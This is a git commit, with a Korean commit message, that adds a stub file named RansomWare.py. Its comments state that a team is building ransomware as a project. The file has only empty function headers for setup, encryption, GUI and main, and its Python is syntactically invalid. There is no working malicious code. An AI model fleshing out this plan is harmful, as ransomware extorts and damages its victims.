12414439413e7d9d48c10f9f93fb6ae4b9d90f35
qstion05 <qstion05@gmail.com>
2020-11-17 10:01:40 +0900

    기본 베이스 작업

---
+++ RansomWare.py
@@ -0,0 +1,26 @@
+#Team.0verfly 두번째 프로젝트
+#Ransomware 만들기.
+#주석은 자세히, 풀리퀘는 꼼꼼히
+
+
+def Initial Setting():
+	#초기 설정파트(추후 외부 함수 추가 및 수정할 것)
+
+
+
+
+def Encryption():
+	#암호화 파트(추후 외부 함수 추가 및 수정할 것)
+
+
+
+def GUI():
+	#GUI파트(추후 외부 함수 추가 및 수정할 것)
+
+
+
+def main():
+	#main
+
+if __name__ == "__main__":
+	main()
